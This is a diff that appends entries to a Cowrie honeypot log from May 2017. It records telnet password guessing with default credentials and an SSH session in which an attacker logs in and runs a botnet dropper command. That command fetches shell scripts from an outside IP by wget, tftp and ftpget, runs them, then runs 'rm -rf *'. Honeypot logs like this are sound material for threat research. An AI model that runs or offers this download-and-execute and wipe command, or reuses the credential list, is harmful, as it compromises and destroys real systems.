@@ -1335,3 +1335,99 @@
 2017-05-15T14:22:56+0000 [CowrieTelnetTransport,79698,52.15.233.30] login return, expect: [support/support]
 2017-05-15T14:22:57+0000 [CowrieTelnetTransport,79698,52.15.233.30] login attempt [sh//bin/busybox ECCHI] failed
 2017-05-15T14:22:57+0000 [CowrieTelnetTransport,79698,52.15.233.30] Warning: state changed and new state returned
+2017-05-15T14:23:01+0000 [CowrieTelnetTransport,79699,52.15.233.30] login attempt: 41773
+2017-05-15T14:23:01+0000 [CowrieTelnetTransport,79699,52.15.233.30] login return, expect: [support/support]
+2017-05-15T14:23:02+0000 [CowrieTelnetTransport,79699,52.15.233.30] login attempt [root/admin] failed
+2017-05-15T14:23:02+0000 [CowrieTelnetTransport,79699,52.15.233.30] Warning: state changed and new state returned
+2017-05-15T14:23:02+0000 [HoneyPotSSHTransport,96521,91.108.68.156] Remote SSH version: SSH-2.0-libssh2_1.4.3
+2017-05-15T14:23:02+0000 [HoneyPotSSHTransport,96521,91.108.68.156] kex alg, key alg: 'diffie-hellman-group14-sha1' 'ssh-rsa'
+2017-05-15T14:23:02+0000 [HoneyPotSSHTransport,96521,91.108.68.156] outgoing: 'aes128-ctr' 'hmac-sha1' 'none'
+2017-05-15T14:23:02+0000 [HoneyPotSSHTransport,96521,91.108.68.156] incoming: 'aes128-ctr' 'hmac-sha1' 'none'
+2017-05-15T14:23:02+0000 [CowrieTelnetTransport,79696,52.15.233.30] Connection lost after 38 seconds
+2017-05-15T14:23:02+0000 [HoneyPotSSHTransport,96521,91.108.68.156] NEW KEYS
+2017-05-15T14:23:02+0000 [HoneyPotSSHTransport,96521,91.108.68.156] starting service 'ssh-userauth'
+2017-05-15T14:23:02+0000 [SSHService 'ssh-userauth' on HoneyPotSSHTransport,96521,91.108.68.156] '1111' trying auth 'password'
+2017-05-15T14:23:03+0000 [SSHService 'ssh-userauth' on HoneyPotSSHTransport,96521,91.108.68.156] login attempt: 2
+2017-05-15T14:23:03+0000 [SSHService 'ssh-userauth' on HoneyPotSSHTransport,96521,91.108.68.156] login return, expect: [1111/1111]
+2017-05-15T14:23:03+0000 [SSHService 'ssh-userauth' on HoneyPotSSHTransport,96521,91.108.68.156] login attempt [1111/1111] succeeded
+2017-05-15T14:23:05+0000 [SSHService 'ssh-userauth' on HoneyPotSSHTransport,96521,91.108.68.156] '1111' authenticated with 'password'
+2017-05-15T14:23:05+0000 [SSHService 'ssh-userauth' on HoneyPotSSHTransport,96521,91.108.68.156] starting service 'ssh-connection'
+2017-05-15T14:23:05+0000 [CowrieTelnetTransport,79699,52.15.233.30] login attempt: 41774
+2017-05-15T14:23:05+0000 [CowrieTelnetTransport,79699,52.15.233.30] login return, expect: [support/support]
+2017-05-15T14:23:06+0000 [CowrieTelnetTransport,79699,52.15.233.30] login attempt [enable/shell] failed
+2017-05-15T14:23:06+0000 [CowrieTelnetTransport,79699,52.15.233.30] Warning: state changed and new state returned
+2017-05-15T14:23:06+0000 [CowrieTelnetTransport,79699,52.15.233.30] login attempt: 41775
+2017-05-15T14:23:06+0000 [CowrieTelnetTransport,79699,52.15.233.30] login return, expect: [support/support]
+2017-05-15T14:23:07+0000 [CowrieTelnetTransport,79699,52.15.233.30] login attempt [sh//bin/busybox ECCHI] failed
+2017-05-15T14:23:07+0000 [CowrieTelnetTransport,79699,52.15.233.30] Warning: state changed and new state returned
+2017-05-15T14:23:07+0000 [SSHService 'ssh-connection' on HoneyPotSSHTransport,96521,91.108.68.156] got channel 'session' request
+2017-05-15T14:23:07+0000 [SSHChannel session (0) on SSHService 'ssh-connection' on HoneyPotSSHTransport,96521,91.108.68.156] channel open
+2017-05-15T14:23:07+0000 [SSHChannel session (0) on SSHService 'ssh-connection' on HoneyPotSSHTransport,96521,91.108.68.156] executing command "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://107.174.34.68/Swag.sh; chmod 777 Swag.sh; sh Swag.sh; tftp 107.174.34.68 -c get tftp1.sh; chmod 777 tftp1.sh; sh tftp1.sh; tftp -r tftp2.sh -g 107.174.34.68; chmod 777 tftp2.sh; sh tftp2.sh; ftpget -v -u anonymous -p anonymous -P 21 107.174.34.68 ftp1.sh ftp1.sh; sh ftp1.sh; rm -rf Swag.sh tftp1.sh tftp2.sh ftp1.sh; rm -rf *"
+2017-05-15T14:23:07+0000 [SSHChannel session (0) on SSHService 'ssh-connection' on HoneyPotSSHTransport,96521,91.108.68.156] Opening TTY Log: log/tty/20170515-142307-98da9015-0e.log
+2017-05-15T14:23:07+0000 [SSHChannel session (0) on SSHService 'ssh-connection' on HoneyPotSSHTransport,96521,91.108.68.156] CMD: cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://107.174.34.68/Swag.sh; chmod 777 Swag.sh; sh Swag.sh; tftp 107.174.34.68 -c get tftp1.sh; chmod 777 tftp1.sh; sh tftp1.sh; tftp -r tftp2.sh -g 107.174.34.68; chmod 777 tftp2.sh; sh tftp2.sh; ftpget -v -u anonymous -p anonymous -P 21 107.174.34.68 ftp1.sh ftp1.sh; sh ftp1.sh; rm -rf Swag.sh tftp1.sh tftp2.sh ftp1.sh; rm -rf *
+2017-05-15T14:23:07+0000 [SSHChannel session (0) on SSHService 'ssh-connection' on HoneyPotSSHTransport,96521,91.108.68.156] Command found: cd /tmp
+2017-05-15T14:23:07+0000 [SSHChannel session (0) on SSHService 'ssh-connection' on HoneyPotSSHTransport,96521,91.108.68.156] Command found: cd /var/run
+2017-05-15T14:23:07+0000 [SSHChannel session (0) on SSHService 'ssh-connection' on HoneyPotSSHTransport,96521,91.108.68.156] Command found: cd /mnt
+2017-05-15T14:23:07+0000 [SSHChannel session (0) on SSHService 'ssh-connection' on HoneyPotSSHTransport,96521,91.108.68.156] Command found: cd /root
+2017-05-15T14:23:07+0000 [SSHChannel session (0) on SSHService 'ssh-connection' on HoneyPotSSHTransport,96521,91.108.68.156] Command found: cd /
+2017-05-15T14:23:07+0000 [SSHChannel session (0) on SSHService 'ssh-connection' on HoneyPotSSHTransport,96521,91.108.68.156] Command found: wget http://107.174.34.68/Swag.sh
+2017-05-15T14:23:07+0000 [cowrie.commands.wget.HTTPProgressDownloader#info] Starting factory <HTTPProgressDownloader: http://107.174.34.68/Swag.sh>
+2017-05-15T14:23:11+0000 [HTTPPageDownloader,client] Not storing duplicate content 597e812e875da845cd2cbfd30f6709b3105fe18c77aceadc6e2460dadde222f9
+2017-05-15T14:23:11+0000 [HTTPPageDownloader,client] Downloaded URL (http://107.174.34.68/Swag.sh) with SHA-256 597e812e875da845cd2cbfd30f6709b3105fe18c77aceadc6e2460dadde222f9 to dl/597e812e875da845cd2cbfd30f6709b3105fe18c77aceadc6e2460dadde222f9
+2017-05-15T14:23:11+0000 [HTTPPageDownloader,client] Command found: chmod 777 /Swag.sh
+2017-05-15T14:23:11+0000 [HTTPPageDownloader,client] Command found: sh /Swag.sh
+2017-05-15T14:23:11+0000 [HTTPPageDownloader,client] Command found: tftp 107.174.34.68 -c get tftp1.sh
+2017-05-15T14:23:11+0000 [HTTPPageDownloader,client] Command found: chmod 777 tftp1.sh
+2017-05-15T14:23:11+0000 [HTTPPageDownloader,client] Command found: sh tftp1.sh
+2017-05-15T14:23:11+0000 [HTTPPageDownloader,client] Command found: tftp -r tftp2.sh -g 107.174.34.68
+2017-05-15T14:23:11+0000 [HTTPPageDownloader,client] Command found: chmod 777 tftp2.sh
+2017-05-15T14:23:11+0000 [HTTPPageDownloader,client] Command found: sh tftp2.sh
+2017-05-15T14:23:11+0000 [HTTPPageDownloader,client] Command found: ftpget -v -u anonymous -p anonymous -P 21 107.174.34.68 ftp1.sh ftp1.sh
+2017-05-15T14:23:11+0000 [HTTPPageDownloader,client] FTP connect failed: host=107.174.34.68, port=21, err=[Errno 111] Connection refused
+2017-05-15T14:23:11+0000 [HTTPPageDownloader,client] Command found: sh ftp1.sh
+2017-05-15T14:23:11+0000 [HTTPPageDownloader,client] Command found: rm -rf /Swag.sh tftp1.sh tftp2.sh ftp1.sh
+2017-05-15T14:23:11+0000 [HTTPPageDownloader,client] Command found: rm -rf /lost+found /vmlinuz /srv /sys /run /sbin /proc /mnt /bin /usr /tmp /var /initrd.img /etc /opt /boot /selinux /home /media /lib /root /dev
+2017-05-15T14:23:11+0000 [HTTPPageDownloader,client] exitCode: 0
+2017-05-15T14:23:11+0000 [HTTPPageDownloader,client] sending request 'exit-status'
+2017-05-15T14:23:11+0000 [HTTPPageDownloader,client] Not storing duplicate content 597e812e875da845cd2cbfd30f6709b3105fe18c77aceadc6e2460dadde222f9
+2017-05-15T14:23:11+0000 [HTTPPageDownloader,client] Saved redir contents with SHA-256 597e812e875da845cd2cbfd30f6709b3105fe18c77aceadc6e2460dadde222f9 to dl/597e812e875da845cd2cbfd30f6709b3105fe18c77aceadc6e2460dadde222f9
+2017-05-15T14:23:11+0000 [HTTPPageDownloader,client] Closing TTY Log: log/tty/20170515-142307-98da9015-0e.log after 3 seconds
+2017-05-15T14:23:11+0000 [HTTPPageDownloader,client] honeypot terminal protocol connection lost [Failure instance: Traceback (failure with no frames): <class 'twisted.internet.error.ConnectionDone'>: Connection was closed cleanly.
+	]
+2017-05-15T14:23:11+0000 [HTTPPageDownloader,client] sending close 0
+2017-05-15T14:23:11+0000 [cowrie.commands.wget.HTTPProgressDownloader#info] Stopping factory <HTTPProgressDownloader: http://107.174.34.68/Swag.sh>
+2017-05-15T14:23:17+0000 [SSHChannel session (0) on SSHService 'ssh-connection' on HoneyPotSSHTransport,96521,91.108.68.156] remote close
+2017-05-15T14:23:19+0000 [CowrieTelnetTransport,79697,52.15.233.30] Connection lost after 38 seconds
+2017-05-15T14:23:22+0000 [HoneyPotSSHTransport,96521,91.108.68.156] avatar 1111 logging out
+2017-05-15T14:23:22+0000 [HoneyPotSSHTransport,96521,91.108.68.156] connection lost
+2017-05-15T14:23:22+0000 [HoneyPotSSHTransport,96521,91.108.68.156] Connection lost after 64 seconds
+2017-05-15T14:23:24+0000 [cowrie.telnet.transport.HoneyPotTelnetFactory] New connection: 52.15.233.30:36752 (10.8.41.81:2223) [session: TT79700]
+2017-05-15T14:23:25+0000 [cowrie.ssh.factory.CowrieSSHFactory] New connection: 116.31.116.17:18299 (10.8.41.81:2222) [session: ad50f66b]
+2017-05-15T14:23:26+0000 [HoneyPotSSHTransport,96523,116.31.116.17] Remote SSH version: SSH-2.0-PUTTY
+2017-05-15T14:23:26+0000 [HoneyPotSSHTransport,96523,116.31.116.17] kex alg, key alg: 'diffie-hellman-group14-sha1' 'ssh-rsa'
+2017-05-15T14:23:26+0000 [HoneyPotSSHTransport,96523,116.31.116.17] outgoing: 'aes128-ctr' 'hmac-sha1' 'none'
+2017-05-15T14:23:26+0000 [HoneyPotSSHTransport,96523,116.31.116.17] incoming: 'aes128-ctr' 'hmac-sha1' 'none'
+2017-05-15T14:23:27+0000 [HoneyPotSSHTransport,96523,116.31.116.17] NEW KEYS
+2017-05-15T14:23:27+0000 [HoneyPotSSHTransport,96523,116.31.116.17] starting service 'ssh-userauth'
+2017-05-15T14:23:28+0000 [SSHService 'ssh-userauth' on HoneyPotSSHTransport,96523,116.31.116.17] 'root' trying auth 'none'
+2017-05-15T14:23:29+0000 [SSHService 'ssh-userauth' on HoneyPotSSHTransport,96523,116.31.116.17] 'root' authenticated with 'none'
+2017-05-15T14:23:29+0000 [SSHService 'ssh-userauth' on HoneyPotSSHTransport,96523,116.31.116.17] starting service 'ssh-connection'
+2017-05-15T14:23:29+0000 [CowrieTelnetTransport,79698,52.15.233.30] Connection lost after 39 seconds
+2017-05-15T14:23:30+0000 [CowrieTelnetTransport,79700,52.15.233.30] login attempt: 41776
+2017-05-15T14:23:30+0000 [CowrieTelnetTransport,79700,52.15.233.30] login return, expect: [support/support]
+2017-05-15T14:23:30+0000 [CowrieTelnetTransport,79700,52.15.233.30] login attempt [admin/password] failed
+2017-05-15T14:23:30+0000 [CowrieTelnetTransport,79700,52.15.233.30] Warning: state changed and new state returned
+2017-05-15T14:23:30+0000 [HoneyPotSSHTransport,96523,116.31.116.17] Got remote error, code 11
+	reason: 
+2017-05-15T14:23:30+0000 [HoneyPotSSHTransport,96523,116.31.116.17] avatar root logging out
+2017-05-15T14:23:30+0000 [HoneyPotSSHTransport,96523,116.31.116.17] connection lost
+2017-05-15T14:23:30+0000 [HoneyPotSSHTransport,96523,116.31.116.17] Connection lost after 5 seconds
+2017-05-15T14:23:31+0000 [CowrieTelnetTransport,79700,52.15.233.30] login attempt: 41777
+2017-05-15T14:23:31+0000 [CowrieTelnetTransport,79700,52.15.233.30] login return, expect: [support/support]
+2017-05-15T14:23:32+0000 [CowrieTelnetTransport,79700,52.15.233.30] login attempt [enable/shell] failed
+2017-05-15T14:23:32+0000 [CowrieTelnetTransport,79700,52.15.233.30] Warning: state changed and new state returned
+2017-05-15T14:23:32+0000 [CowrieTelnetTransport,79700,52.15.233.30] login attempt: 41778
+2017-05-15T14:23:32+0000 [CowrieTelnetTransport,79700,52.15.233.30] login return, expect: [support/support]
+2017-05-15T14:23:33+0000 [CowrieTelnetTransport,79700,52.15.233.30] login attempt [sh//bin/busybox ECCHI] failed
+2017-05-15T14:23:33+0000 [CowrieTelnetTransport,79700,52.15.233.30] Warning: state changed and new state returned
+2017-05-15T14:23:39+0000 [CowrieTelnetTransport,79699,52.15.233.30] Connection lost after 43 seconds
